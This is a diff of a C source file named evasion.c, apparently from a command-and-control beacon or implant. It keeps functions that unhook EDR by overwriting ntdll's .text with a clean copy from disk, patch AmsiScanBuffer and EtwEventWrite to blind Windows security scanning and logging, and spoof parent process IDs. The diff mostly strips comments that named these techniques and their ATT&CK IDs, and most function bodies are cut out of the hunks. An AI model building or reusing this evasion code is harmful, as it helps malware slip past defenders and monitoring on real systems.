@@ -1,22 +1,13 @@
-// src/evasion.c
-// Mod 83/84: NTDLL unhooking | Mod 105/110: AMSI/ETW patching | Mod 47: PPID spoofing
-#include <windows.h>
+#include "common.h"
 #include "ntdefs.h"
 #include <stdio.h>
 #include<intrin.h>
 #define NTDLL_NAME "NTDLL.DLL"
 #define MAP_NTDLL
 
-// NTDLL
-/*
-1. Open a fresh copy of ntdll.dll from disk
-2. Map it into memory
-3. Compare .text section to loaded (hooked) NTDLL
-4. Overwrite hooked bytes with clean bytes
-5. Call this ONCE before your beacon loop starts
-*/
 
-// ── Step 1: Map a clean copy of ntdll.dll from disk ─────────────
+
+//  Map a clean copy of ntdll.dll from disk 
 BOOL MapNtdllFromDisk(OUT PVOID *ppNtdllBuf) {
   HANDLE hFile = NULL;
   HANDLE hSection = NULL;
@@ -73,9 +64,7 @@ _EndOfFunc:
   return TRUE;
 }
 
-// ── Step 2: Get base address of the loaded (hooked) ntdll ────────
-// ntdll is always the 2nd entry in InMemoryOrderModuleList
-// (1st is the current process image)
+
 PVOID FetchLocalNtdllBaseAddress() {
 #ifdef _WIN64
   PPEB pPeb = (PPEB)__readgsqword(0x60);
@@ -91,7 +80,7 @@ PVOID FetchLocalNtdllBaseAddress() {
   return pLdr->DllBase;
 }
 
-// ── Step 3: Overwrite hooked .text with clean .text ──────────────
+// Overwrite hooked .text with clean .text 
 BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {
   PVOID pLocalNtdll = FetchLocalNtdllBaseAddress();
 
@@ -163,7 +152,7 @@ BOOL ReplaceNtdllTxtSection(IN PVOID pUnhookedNtdll) {
   return TRUE;
 }
 
-// ── Wrapper: call this ONCE at top of beacon_run() ───────────────
+// Wrapper: call this ONCE at top of beacon_run() 
 BOOL unhook_ntdll() {
   PVOID pCleanNtdll = NULL;
 
@@ -189,8 +178,7 @@ BOOL unhook_ntdll() {
   return TRUE;
 }
 
-// -- Mod 105: AMSI bypass (T1562.001) ---------------------------------
-// Patches AmsiScanBuffer to always return AMSI_RESULT_CLEAN
+
 BOOL patch_amsi() {
     HMODULE hAmsi = LoadLibraryA("amsi.dll");
     if (!hAmsi) {
@@ -221,8 +209,6 @@ BOOL patch_amsi() {
     return TRUE;
 }
 
-// -- Mod 110: ETW bypass (T1562.001) ----------------------------------
-// Patches EtwEventWrite in ntdll to return immediately
 BOOL patch_etw() {
     HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
     if (!hNtdll) return FALSE;
@@ -250,8 +236,7 @@ BOOL patch_etw() {
     return TRUE;
 }
 
-// -- Mod 47: PPID spoofing (T1036) ------------------------------------
-// Creates a process with a spoofed parent PID
+
 BOOL ppid_spoof(DWORD parentPid, LPCSTR targetExe,
                 PPROCESS_INFORMATION pPi) {
     STARTUPINFOEXA si = {0};
